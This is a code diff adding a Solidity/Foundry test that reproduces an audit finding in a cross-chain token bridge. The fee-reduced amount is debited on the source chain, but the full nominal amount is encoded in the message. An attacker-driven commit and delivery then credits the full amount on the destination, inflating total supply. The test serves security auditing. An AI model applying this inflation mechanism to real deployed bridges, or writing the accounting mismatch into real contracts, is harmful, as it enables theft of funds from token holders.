@@ -2215,6 +2215,52 @@ contract IceBallQuery is Test {
         assertEq(dstApp.balanceOf(RECEIVER), 0, "out-of-order delivery must not credit anything");
     }
 
+    function test_ASSERT_FeeOnTransferSupplyInflation_HOLDS_DIRECT() public {
+        // Zillion finding #12 claim: "supply increases beyond single
+        // legitimate delivery" (generic invariant). The concrete, named
+        // mechanism in this codebase is FEE01 (fee-on-transfer/adapter
+        // accounting mismatch): sendFeeOnTransfer deducts the FEE-REDUCED
+        // amount from the sender's balance/supply, but encodes the FULL
+        // NOMINAL amount into the message. If delivered via the normal,
+        // legitimate commit+deliver path (same one already proven to work
+        // honestly in findings #9/#10/#11), the destination credits the
+        // full amount - more than was actually removed on the source side.
+        // Testing directly with real balance/supply deltas on BOTH sides.
+        uint256 feeBps = 1000; // 10% fee
+        uint256 srcSupplyBefore = srcApp.totalSupply();
+        uint256 dstSupplyBefore = dstApp.totalSupply();
+        uint256 aliceBalBefore = srcApp.balanceOf(ALICE);
+
+        vm.prank(ALICE);
+        (bytes memory message, uint64 nonce) = srcApp.sendFeeOnTransfer(DST_EID, RECEIVER, AMT, feeBps);
+
+        uint256 actuallyRemoved = AMT - (AMT * feeBps / 10000);
+        assertEq(srcApp.totalSupply(), srcSupplyBefore - actuallyRemoved, "sanity: only the fee-reduced amount should leave source supply");
+        assertEq(srcApp.balanceOf(ALICE), aliceBalBefore - actuallyRemoved, "sanity: sender debited only the fee-reduced amount");
+
+        bytes32 senderKey = bytes32(uint256(uint160(address(srcApp))));
+        bytes32 headerHash = keccak256(abi.encodePacked(SRC_EID, senderKey, DST_EID, address(dstApp), nonce));
+        bytes32 guid = _computeGuid(nonce, SRC_EID, senderKey, DST_EID, address(dstApp));
+        bytes memory guidCombined = abi.encodePacked(guid, message);
+
+        vm.prank(dvnA.currentSigner());
+        dvnA.attest(headerHash, guidCombined, guidCombined, 10, 100);
+        vm.prank(address(dvnB));
+        dvnB.attest(headerHash, guidCombined, guidCombined, 10, 100);
+
+        vm.prank(ATTACKER);
+        uln.commitVerification(address(dstApp), SRC_EID, senderKey, nonce, headerHash, keccak256(guidCombined), DST_EID, 1);
+
+        vm.prank(ATTACKER);
+        dstEndpoint.lzReceive(address(dstApp), SRC_EID, senderKey, nonce, guid, message);
+
+        uint256 dstSupplyAfter = dstApp.totalSupply();
+        uint256 dstCredited = dstSupplyAfter - dstSupplyBefore;
+
+        assertEq(dstCredited, AMT, "destination credited the FULL nominal amount, not the fee-reduced amount");
+        assertTrue(dstCredited > actuallyRemoved, "COMBINED SUPPLY INCREASED: more was credited on destination than was ever removed on source");
+    }
+
     // ================================================================
     // DIRECT tests for the remaining 5 findings (A01+D45, D45, K97, M99,
     // M100) - previously confirmed ONLY via harness self-detection
